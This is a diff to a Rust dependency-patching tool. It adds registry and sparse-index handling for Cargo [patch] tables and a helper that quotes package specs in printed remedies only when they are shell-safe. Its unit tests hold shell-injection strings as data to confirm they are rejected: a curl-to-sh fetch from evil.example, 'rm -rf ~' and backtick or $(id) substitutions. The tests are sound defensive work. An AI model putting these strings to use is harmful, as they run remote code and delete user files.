@@ -145,23 +145,22 @@ use std::collections::{BTreeMap, BTreeSet};
 
 use toml_edit::{DocumentMut, Item, TableLike};
 
-use crate::patch::redirect::is_crates_io_source as is_crates_io_lock_source;
-
 use super::{
     names_vendor_dir, simple_purl, socket_patch_name_uuid, toml_or_diag, vendor_ref, DiscoverCtx,
     Discovery, PatchedRef, TomlDiag, UnattestedKind, UnlockedPin, VendorRef, DIAG_REF_INVALID,
     DIAG_REF_UNATTRIBUTABLE,
 };
-use crate::formats::cargo::{is_registry_source, CargoLock, CopyClaim, LockedPackage};
+use crate::formats::cargo::{
+    is_crates_io_patch_table, is_crates_io_source, is_registry_source, CargoLock, CopyClaim,
+    LockedPackage,
+};
 use crate::patch::redirect::generation::{hosted_pin_name, PIN_NAME_PREFIX};
 use crate::patch::redirect::{cargo_req_selects, CargoReqMatch};
 use crate::utils::digest::is_hex64_lower;
 use crate::vendor::cargo_config::{
     effective_config_rel_in, patch_entries, registry_definitions, CONFIG_LEGACY, CONFIG_TOML,
 };
-use crate::vendor::cargo_manifest::{
-    crates_io_url_alias_tables, is_crates_io_source, is_crates_io_url_alias,
-};
+use crate::vendor::cargo_manifest::{crates_io_url_alias_tables, is_crates_io_url_alias};
 use crate::vendor::cargo_tag;
 use crate::vendor::lock_inventory::LockIntegrity;
 
@@ -306,6 +305,7 @@ async fn extract_root(ctx: &DiscoverCtx<'_>, root: Option<DocumentMut>, out: &mu
         lock: &lock,
         decls: decls.as_ref(),
         wired: &wired,
+        registries: &config_registries(config.as_ref()),
     };
     if let Some(doc) = manifest {
         vendored_from_patches(ctx, CARGO_TOML, doc, shadow.as_ref(), &bypass, out).await;
@@ -532,11 +532,11 @@ impl DeclSource {
     fn patched_by(&self, registry: Option<&str>, table: &str) -> bool {
         match self {
             DeclSource::Registry => match registry.map(str::trim) {
-                None | Some("crates-io") => is_crates_io_source(table),
+                None | Some("crates-io") => is_crates_io_patch_table(table),
                 Some(reg) => reg == table,
             },
             DeclSource::RegistryIndex(url) => {
-                (is_crates_io_url_alias(url) && is_crates_io_source(table))
+                (is_crates_io_url_alias(url) && is_crates_io_patch_table(table))
                     || patch_source_key(url) == patch_source_key(table)
             }
             DeclSource::Git(url) => git_key(url).is_some_and(|k| git_key(table) == Some(k)),
@@ -545,13 +545,22 @@ impl DeclSource {
     }
 
     /// The source a `Cargo.lock` `source` names, as far as a `[patch]` table
-    /// can redirect it: crates.io, or a git repository (its `?query` / `#rev`
-    /// cut). `None` for anything else.
+    /// can redirect it: crates.io, another registry's index (a `sparse+`
+    /// index keeps its prefix: it is another source than the git index at
+    /// that URL), or a git repository (its `?query` / `#rev` cut). `None`
+    /// for anything else.
     fn of_lock_source(source: &str) -> Option<DeclSource> {
-        if is_crates_io_lock_source(source) {
+        if is_crates_io_source(source) {
             return Some(DeclSource::Registry);
         }
-        let repo = source.trim().strip_prefix("git+")?;
+        let source = source.trim();
+        if let Some(index) = source.strip_prefix("registry+") {
+            return Some(DeclSource::RegistryIndex(index.to_string()));
+        }
+        if source.starts_with("sparse+") {
+            return Some(DeclSource::RegistryIndex(source.to_string()));
+        }
+        let repo = source.strip_prefix("git+")?;
         Some(DeclSource::Git(
             repo.split(['?', '#']).next().unwrap_or(repo).to_string(),
         ))
@@ -712,6 +721,46 @@ fn git_key(url: &str) -> Option<String> {
         url = stripped.to_string();
     }
     Some(url)
+}
+
+/// How a remedy names the lock entry of `name` `version` from `source` to
+/// `cargo update -p` and `cargo tree -i`, as the argument to print.
+///
+/// The lock holds the vendored copy at `<version>+socket.<uuid>` too, and
+/// cargo leaves build metadata out when it matches a spec, so `name` and
+/// `name@version` both fit two packages and cargo refuses them as
+/// ambiguous. The source tells them apart: the index or repository URL as
+/// cargo compares it, without the `registry+` / `git+` kind (older cargos
+/// do not read one) and without a git entry's `?reference` and `#commit`
+/// (so two references of one repository still share a spec). A sparse
+/// index keeps its `sparse+`, which is part of its URL.
+///
+/// The source is whatever the lock says, and the remedy is a line a user
+/// pastes into a shell. It is printed, quoted, only when every character
+/// of it is one no shell reads inside double quotes. Any other source
+/// gets the bare name: cargo answers that with the specs it accepts.
+fn lock_entry_spec(source: &str, name: &str, version: &str) -> String {
+    let source = source.trim();
+    let url = if let Some(index) = source.strip_prefix("registry+") {
+        index
+    } else if let Some(repo) = source.strip_prefix("git+") {
+        repo.split(['?', '#']).next().unwrap_or(repo)
+    } else {
+        source
+    };
+    let plain = |text: &str| {
+        !text.is_empty()
+            && text
+                .chars()
+                .all(|c| c.is_ascii_alphanumeric() || "-._~:/+@%=,".contains(c))
+    };
+    match (plain(name) && plain(version), plain(url)) {
+        (true, true) => format!("\"{url}#{name}@{version}\""),
+        (true, false) => name.to_string(),
+        // A name or version no crate has: nothing of it goes on a command
+        // line.
+        (false, _) => "<crate>".to_string(),
+    }
 }
 
 /// The source of a lock entry of `name` at exactly `version` that is not a
@@ -1346,8 +1395,8 @@ fn unpatched_twins(ctx: &DiscoverCtx<'_>, lock: &Lock, out: &mut Discovery) {
             &format!(
                 "resolves the same crate version from another source, which cargo builds \
                  beside the Socket copy for the dependents that lock it (`cargo tree -i \
-                 {}@{}` lists them)",
-                pkg.name, pkg.version
+                 {}` lists them)",
+                lock_entry_spec(source, &pkg.name, &pkg.version)
             ),
         );
     }
@@ -1614,6 +1663,22 @@ struct Shadow {
     registries: BTreeMap<String, String>,
 }
 
+/// The project config's `[registries.<name>] index` values, by name. A
+/// registry the user's own cargo config or the environment defines is not
+/// among them.
+fn config_registries(config: Option<&(&'static str, DocumentMut)>) -> BTreeMap<String, String> {
+    config
+        .and_then(|(_, doc)| doc.get("registries"))
+        .and_then(toml_edit::Item::as_table_like)
+        .into_iter()
+        .flat_map(|t| t.iter())
+        .filter_map(|(name, item)| {
+            let index = item.as_table_like()?.get("index")?.as_str()?;
+            Some((name.to_string(), index.to_string()))
+        })
+        .collect()
+}
+
 /// One config `[patch]` item as [`Shadow`] compares it: (file, source
 /// table, key, path, registry).
 type ConfigPatchItem = (&'static str, String, String, Option<String>, Option<String>);
@@ -1641,8 +1706,8 @@ fn patch_source_key(source: &str) -> String {
 /// crates.io under any spelling, else the same name or URL
 /// ([`patch_source_key`]).
 fn same_patch_source(a: &str, b: &str) -> bool {
-    if is_crates_io_source(a) || is_crates_io_source(b) {
-        return is_crates_io_source(a) && is_crates_io_source(b);
+    if is_crates_io_patch_table(a) || is_crates_io_patch_table(b) {
+        return is_crates_io_patch_table(a) && is_crates_io_patch_table(b);
     }
     patch_source_key(a) == patch_source_key(b)
 }
@@ -1663,20 +1728,10 @@ impl Shadow {
                 })
             })
             .collect();
-        let registries = config
-            .and_then(|(_, doc)| doc.get("registries"))
-            .and_then(toml_edit::Item::as_table_like)
-            .into_iter()
-            .flat_map(|t| t.iter())
-            .filter_map(|(name, item)| {
-                let index = item.as_table_like()?.get("index")?.as_str()?;
-                Some((name.to_string(), index.to_string()))
-            })
-            .collect();
         Shadow {
             aliases: crates_io_url_alias_tables(manifest),
             config_keys,
-            registries,
+            registries: config_registries(config),
         }
     }
 
@@ -1734,6 +1789,9 @@ struct Bypass<'a> {
     /// The `[patch]` entries pointing at a Socket copy that cargo honors
     /// (a shadowed manifest entry redirects nothing).
     wired: &'a [WiredCopy],
+    /// The project config's `[registries.<name>] index` values:
+    /// `[patch.<name>]` redirects the entries locked from that index.
+    registries: &'a BTreeMap<String, String>,
 }
 
 /// Mark the vendored ref `purl` (the copy `vref` of `name`@`version`)
@@ -1850,19 +1908,26 @@ fn patch_bypassed(
         }
         (None, Some(source)) => {
             // An entry a `[patch]` table pointing at the copy redirects
-            // (crates.io under `[patch.crates-io]`, a git repository under its
-            // own table) is stale: cargo would redirect it. Any other is
-            // declared by some dependency, or left over from one that was
-            // removed.
+            // (crates.io under `[patch.crates-io]`, another registry or a
+            // git repository under its own table, a registry's by its index
+            // URL or by the name the config defines for it) is stale: cargo
+            // would redirect it. Any other is declared by some dependency,
+            // or left over from one that was removed.
             let stale = DeclSource::of_lock_source(source).and_then(|src| {
                 pins.iter()
-                    .find(|(table, _)| src.patched_by(None, table))
+                    .find(|(table, _)| {
+                        let index = bypass.registries.get(table.trim());
+                        src.patched_by(None, table)
+                            || index.is_some_and(|index| src.patched_by(None, index))
+                    })
                     .map(|(table, _)| *table)
             });
+            // The bare `name@version` is ambiguous beside the copy.
+            let spec = lock_entry_spec(source, name, version);
             let remedy = if let Some(table) = stale {
                 // `vendor` writes `[patch.crates-io]` only, so it re-locks
                 // only a crates.io entry.
-                let vendor = if is_crates_io_source(table) {
+                let vendor = if is_crates_io_patch_table(table) {
                     "re-run `socket-patch vendor`, or "
                 } else {
                     ""
@@ -1874,13 +1939,13 @@ fn patch_bypassed(
                 };
                 format!(
                     "the entry is stale (`[patch.{table}]` redirects its source), so \
-                     re-lock: {vendor}`cargo update -p {name}`"
+                     re-lock: {vendor}`cargo update -p {spec}`"
                 )
             } else {
                 format!(
-                    "`cargo tree -i {name}@{version}` names the dependency that declares it \
+                    "`cargo tree -i {spec}` names the dependency that declares it \
                      (change that declaration or roll the patch back); if none does any \
-                     more, re-lock with `cargo update -p {name}`"
+                     more, re-lock with `cargo update -p {spec}`"
                 )
             };
             (
@@ -5111,7 +5176,10 @@ mod tests {
         let u = bypassed_mark(&out, "Cargo.lock");
         assert!(
             u.detail.contains("stale")
-                && u.detail.contains("cargo update -p cfg-if")
+                && u.detail.contains(
+                    "re-run `socket-patch vendor`, or `cargo update -p \
+                     \"https://github.com/rust-lang/crates.io-index#cfg-if@1.0.4\"`"
+                )
                 && !u.detail.contains("Re-running `vendor` does not"),
             "{}",
             u.detail
@@ -5125,7 +5193,11 @@ mod tests {
         .await;
         let u = bypassed_mark(&out, "Cargo.lock");
         assert!(
-            u.detail.contains("cargo tree -i cfg-if@1.0.4") && !u.detail.contains("stale"),
+            u.detail
+                .contains("`cargo tree -i \"https://my-corp.example/index#cfg-if@1.0.4\"`")
+                && u.detail
+                    .contains("`cargo update -p \"https://my-corp.example/index#cfg-if@1.0.4\"`")
+                && !u.detail.contains("stale"),
             "{}",
             u.detail
         );
@@ -5146,11 +5218,156 @@ mod tests {
         assert!(
             u.detail
                 .contains("`[patch.\"https://github.com/corp/fork\"]` redirects its source")
-                && u.detail.contains("cargo update -p cfg-if")
+                && u.detail
+                    .contains("`cargo update -p \"https://github.com/corp/fork#cfg-if@1.0.4\"`")
                 && !u.detail.contains("socket-patch vendor"),
             "{}",
             u.detail
         );
+    }
+
+    /// An entry locked from another registry is stale too when a `[patch]`
+    /// table for that registry points at the copy: by the index URL, or by
+    /// the name the config defines for it. A sparse index is another
+    /// source than the git index at its URL.
+    #[tokio::test]
+    async fn an_entry_of_another_registry_its_patch_table_redirects_is_stale() {
+        let rel = vendor_path(UUID_A, "cfg-if-1.0.4");
+        let wired_under =
+            |table: &str| format!("\n[patch.{table}]\ncfg-if = {{ path = \"{rel}\" }}\n");
+        let stale = |detail: &str, table: &str, spec: &str| {
+            assert!(
+                detail.contains(&format!("`[patch.{table}]` redirects its source"))
+                    && detail.contains(&format!("re-lock: `cargo update -p \"{spec}\"`"))
+                    && !detail.contains("cargo tree -i")
+                    && !detail.contains("socket-patch vendor"),
+                "{detail}"
+            );
+        };
+
+        // By the index URL, however cargo's canonical URL spells it.
+        let out = run(&vendored_workspace(
+            "cfg-if = \"1\"",
+            &wired_under("\"https://My-Corp.example/index/\""),
+            &[("1.0.4", MY_CORP)],
+        ))
+        .await;
+        stale(
+            &bypassed_mark(&out, "Cargo.lock").detail,
+            "\"https://My-Corp.example/index/\"",
+            "https://my-corp.example/index#cfg-if@1.0.4",
+        );
+
+        // By the registry's name, which the project config defines.
+        let p = vendored_workspace(
+            "cfg-if = \"1\"",
+            &wired_under("my-corp"),
+            &[("1.0.4", MY_CORP)],
+        );
+        p.write(
+            ".cargo/config.toml",
+            "[registries.my-corp]\nindex = \"https://my-corp.example/index\"\n",
+        );
+        let out = run(&p).await;
+        stale(
+            &bypassed_mark(&out, "Cargo.lock").detail,
+            "my-corp",
+            "https://my-corp.example/index#cfg-if@1.0.4",
+        );
+
+        // A name the config does not define redirects nothing that is known.
+        let out = run(&vendored_workspace(
+            "cfg-if = \"1\"",
+            &wired_under("my-corp"),
+            &[("1.0.4", MY_CORP)],
+        ))
+        .await;
+        let u = bypassed_mark(&out, "Cargo.lock");
+        assert!(
+            u.detail.contains("cargo tree -i") && !u.detail.contains("stale"),
+            "{}",
+            u.detail
+        );
+
+        // A sparse index: its own table, and not the git index's.
+        let sparse = "sparse+https://my-corp.example/index/";
+        let out = run(&vendored_workspace(
+            "cfg-if = \"1\"",
+            &wired_under("\"sparse+https://my-corp.example/index/\""),
+            &[("1.0.4", sparse)],
+        ))
+        .await;
+        stale(
+            &bypassed_mark(&out, "Cargo.lock").detail,
+            "\"sparse+https://my-corp.example/index/\"",
+            "sparse+https://my-corp.example/index/#cfg-if@1.0.4",
+        );
+        let out = run(&vendored_workspace(
+            "cfg-if = \"1\"",
+            &wired_under("\"https://my-corp.example/index\""),
+            &[("1.0.4", sparse)],
+        ))
+        .await;
+        let u = bypassed_mark(&out, "Cargo.lock");
+        assert!(
+            u.detail.contains("cargo tree -i") && !u.detail.contains("stale"),
+            "{}",
+            u.detail
+        );
+    }
+
+    /// The spec a remedy prints names one lock entry: the source without
+    /// its kind, and a git entry's without its reference and commit.
+    #[test]
+    fn a_lock_entry_spec_carries_the_source_cargo_compares() {
+        for (source, spec) in [
+            (
+                CRATES_IO,
+                "https://github.com/rust-lang/crates.io-index#cfg-if@1.0.4",
+            ),
+            (MY_CORP, "https://my-corp.example/index#cfg-if@1.0.4"),
+            (
+                "sparse+https://my-corp.example/index/",
+                "sparse+https://my-corp.example/index/#cfg-if@1.0.4",
+            ),
+            (
+                "git+https://github.com/corp/fork?branch=main#0123456789abcdef",
+                "https://github.com/corp/fork#cfg-if@1.0.4",
+            ),
+            (
+                "git+https://github.com/corp/fork#0123456789abcdef",
+                "https://github.com/corp/fork#cfg-if@1.0.4",
+            ),
+        ] {
+            assert_eq!(
+                super::lock_entry_spec(source, "cfg-if", "1.0.4"),
+                format!("\"{spec}\"")
+            );
+        }
+        // A source a shell would read into is not printed: the bare name
+        // makes cargo list the specs it accepts.
+        for source in [
+            "git+https://github.com/corp/fork$(curl${IFS}evil.example|sh)#0123456789abcdef",
+            "registry+https://my-corp.example/index\" ; rm -rf ~ ; \"",
+            "registry+https://my-corp.example/`id`",
+            "registry+https://my-corp.example/index name",
+            "registry+https://my-corp.example/!!",
+            "registry+https://my-corp.example/\\index",
+            "registry+",
+        ] {
+            assert_eq!(
+                super::lock_entry_spec(source, "cfg-if", "1.0.4"),
+                "cfg-if",
+                "{source}"
+            );
+        }
+        assert_eq!(
+            super::lock_entry_spec(CRATES_IO, "cfg_if-2", "1.0.4-rc.1+build.5"),
+            "\"https://github.com/rust-lang/crates.io-index#cfg_if-2@1.0.4-rc.1+build.5\""
+        );
+        for (name, version) in [("cfg-if$(id)", "1.0.4"), ("cfg-if", "1.0.4`id`"), ("", "1")] {
+            assert_eq!(super::lock_entry_spec(CRATES_IO, name, version), "<crate>");
+        }
     }
 
     /// Git URLs compare as cargo's `CanonicalUrl` spells them — a GitHub URL
